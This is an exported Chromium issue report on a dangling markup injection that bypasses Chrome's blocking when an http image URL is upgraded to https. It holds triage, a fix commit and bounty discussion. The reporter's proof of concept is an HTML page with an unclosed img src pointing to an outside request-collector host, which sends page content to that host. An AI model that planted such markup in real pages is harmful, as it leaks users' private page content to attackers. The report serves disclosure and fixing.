# Security: leak user html content using Dangling Markup injection when http upgrade to https

| Field | Value |
|-------|-------|
| **Issue ID** | [40058770](https://issues.chromium.org/issues/40058770) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>HTML>Parser |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | oh...@gmail.com |
| **Assignee** | ca...@chromium.org |
| **Created** | 2022-02-14 |
| **Bounty** | $500.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**  

<https://bugs.chromium.org/p/chromium/issues/detail?id=680969>  

According to the above report, it can be seen that chrome blocked attacks such as Dangling Markup injection.  

Of course, it is blocked in the following situations.

victim Server url protocol - attacker's url protocol  

https -> https  

http -> https  

http -> http

But, i found html content was leaked through the img tag in the following situation.

victim server url protocol - attacker's url protocol  

https -> http

#### poc

<html>
<body>
<img src="http://en87sf22sedq7.x.pipedream.net/?q=
<!--flag{this\_is\_secret\_value}-->
<script>console.log("hi");</script>
</body>
</html>

When the attacker's url protocol is upgraded to https, the user html content is leaked by bypassing the patch.  

In addition to img tags, it was also possible with audio and video tags, and there may be more possible tags.  

This allows attackers to get personal information by leaking the user's content when script is unavailable due to security elements such as csp.

**VERSION**  

Chrome Version: 98.0.4758.82 (Official Build) (64-bit)  

Operating System: Windows 10

**REPRODUCTION CASE**

1. Access <https://ssrf.kr/crbug_test.html>
2. Access <https://requestbin.com/r/en87sf22sedq7> and check html content has been leaked

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: SeungJu Oh (@real\_as3617)

## Attachments

- [crbug_test.html](attachments/crbug_test.html) (text/plain, 159 B)

## Timeline

### [Deleted User] (2022-02-14)

[Empty comment from Monorail migration]

### ad...@google.com (2022-02-14)

Thanks for the report.

I can reproduce this on M98.

Trying to work out severity: It looks like the original dangling markup injection was put in place in https://crbug.com/chromium/680970 and this wasn't claimed to be a security fix per-se. However https://crbug.com/chromium/766592 was a bypass and was graded Security_Severity-Low, so that's what I'll do here.

mkwst@, would you take this one and figure out if we should fix it, and if so, who is the right person?

[Monorail components: Blink>HTML>Parser]

### [Deleted User] (2022-02-14)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-15)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### oh...@gmail.com (2022-02-20)

[Comment Deleted]

### oh...@gmail.com (2022-02-20)

After submitting the report, I checked more about what things were possible.
https://bugs.chromium.org/p/chromium/issues/detail?id=1039885 - My payload seems that the patch of this report can also be bypassed.
Perhaps it is possible to bypass almost all patches unless it is a special case.
Also, the security severity of this report was medium. Can my report's severity go up?

### mk...@google.com (2022-02-21)

+carlosil@ as we ought to be blocking this request in https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/loader/base_fetch_context.cc;drc=f7f2dcfbd24f7ee74a0b306043bc757da65f64a6;l=676. Perhaps we're losing the `potentiallyDanglingMarkup` flag somewhere when creating the ResourceRequest, and copying the URL at https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/loader/mixed_content_checker.cc;drc=f7f2dcfbd24f7ee74a0b306043bc757da65f64a6;l=898? If so, that might imply that this is also broken for `upgrade-insecure-requests`. 

### ca...@chromium.org (2022-02-25)

Yeah, taking a look at this, the url.SetProtocol("https") call causes IsPonentiallyDanglingMarkup to become false, so this affects both upgrade-insecure-requests and autoupgrades. I'm not sure how this is happening since it seems it should be carried over in DoCanonicalizeStandardUrl (https://source.chromium.org/chromium/chromium/src/+/main:url/url_canon_stdurl.cc;drc=dc3638e64423b1d2d5e3323b419028ab631f3923;l=108). I'll take a deeper look at this tomorrow.

### ca...@chromium.org (2022-02-26)

So it seems the issue is the flag is lost before we even get to DoCanonicalizeStandardUrl, it's last kept in the 'parsed' parameter passed to DoReplaceComponents (https://source.chromium.org/chromium/chromium/src/+/main:url/url_util.cc;drc=d2f8618e737ac7722fe6e4b0d785f51fc5f2aed2;l=380), but parsed is not used again (except for checking the scheme validity), so the value is not copied to out_parsed.
Adding a 
if (parsed.potentially_dangling_markup) {
    out_parsed->potentially_dangling_markup = true;
  }
check to DoReplaceComponents fixes this, but I need to make sure this is appropriate (since technically DoReplaceComponents can remove the dangling markup, so it's not always appropriate to inherit the flag.

This means that the potentially dangling markup flag is lost on any code that calls DoReplaceComponent, not just mixed content checker.

### ca...@chromium.org (2022-03-08)

Mike: Would it make sense to just add a check equivalent to https://source.chromium.org/chromium/chromium/src/+/main:url/url_canon_etc.cc;drc=e2cba64c183ae17816143ee344e6f7c81451555a;l=62 after DoReplaceComponents replaces the components? That would catch this case, while still covering the case where the component replacement added or removed the potentially dangling markup. LMK what you think.

### mk...@google.com (2022-03-08)

Thanks for following up on this, Carlos!

I think the change you've suggested to `DoReplaceComponents` sounds reasonable. You're correct to suggest that it's possible that the replacement operation could remove the thing that was a problem in the first place, but I think that kind of check would require a little more work than is worthwhile. I'm also hard-pressed to think of cases in which it would break something we didn't want to break.

If you'd like to dig into the more complex approach (which I think would check to see whether the path, query, or ref was being replaced, and then perform the check you've suggested on the replaced content), I'll happily review it. But I think the simpler solution is safer (insofar as it fails closed), and simpler to reason about.

### mk...@google.com (2022-03-10)

[Empty comment from Monorail migration]

### ca...@chromium.org (2022-03-15)

Sorry, I got a bit busy and this fell behind on this. Re #11: In that case I'm happy to go with the simpler solution and add the set the flag in out_parsed. I'll put together a CL and send it over. Thanks for checking!

### gi...@appspot.gserviceaccount.com (2022-03-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f96e7cfcff0c8a75b314b05382c53bbf92c0bf4e

commit f96e7cfcff0c8a75b314b05382c53bbf92c0bf4e
Author: Carlos IL <carlosil@chromium.org>
Date: Wed Mar 16 07:38:59 2022

Carry over potentially dangling markup flag for scheme only replacements

Prior to this change, the potentially dangling markup flag was being
carried over only in DoCanonicalizeStandardURL, but this failed for
scheme-only replacements (since the old parsed URL is not passed to
DoCanonicalize for those). This adds a check for the flag directly in
DoReplaceComponent that covers scheme only replacements.

Bug: 1297138
Change-Id: I120682b6ee094e7aebb614754855c3e1db2b5544
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3527120
Auto-Submit: Carlos IL <carlosil@chromium.org>
Reviewed-by: Mike West <mkwst@chromium.org>
Commit-Queue: Mike West <mkwst@chromium.org>
Cr-Commit-Position: refs/heads/main@{#981520}

[modify] https://crrev.com/f96e7cfcff0c8a75b314b05382c53bbf92c0bf4e/url/url_util.cc
[modify] https://crrev.com/f96e7cfcff0c8a75b314b05382c53bbf92c0bf4e/url/url_util_unittest.cc


### ca...@chromium.org (2022-03-16)

[Empty comment from Monorail migration]

### ca...@chromium.org (2022-03-16)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-16)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-16)

[Empty comment from Monorail migration]

### oh...@gmail.com (2022-03-23)

Thank you for the quick patch! Can I get a CVE ID?

### ca...@chromium.org (2022-03-23)

Thanks for the report. I believe CVE decisions are made by the VRP panel. cc'ing adetaylor and amyressler to confirm.

### am...@chromium.org (2022-03-24)

Thanks for tagging me in carlosil@. 
CVEs aren't part of the VRP process or distributed by the panel, but are instead allocated for externally discovered issues in Stable or Extended Stable, when the patch is included in a Stable channel release. CVE IDs must be tied to a public artifact, so we can only allocate them then as the Stable channel release notes (https://chromereleases.googleblog.com/) are available to be that artifact. 

The CVE ID will be allocated directly to this bug report at that time. 

### oh...@gmail.com (2022-04-01)

[Comment Deleted]

### am...@google.com (2022-04-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-04-11)

Hello, SeungJu. Thank you for this report. Given the relatively minimal impact of this issue we wanted to provide a thank you reward for this report. A member of our finance team will be in touch with you soon to arrange payment. We appreciate your efforts and taking the time to report this issue to us. 

### oh...@gmail.com (2022-04-12)

Thank you for Reward!

### am...@google.com (2022-04-13)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-04-26)

[Empty comment from Monorail migration]

### am...@google.com (2022-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2022-06-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-07-26)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2022-07-29)

This issue was migrated from crbug.com/chromium/1297138?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1301335, crbug.com/chromium/1304166]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058770)*
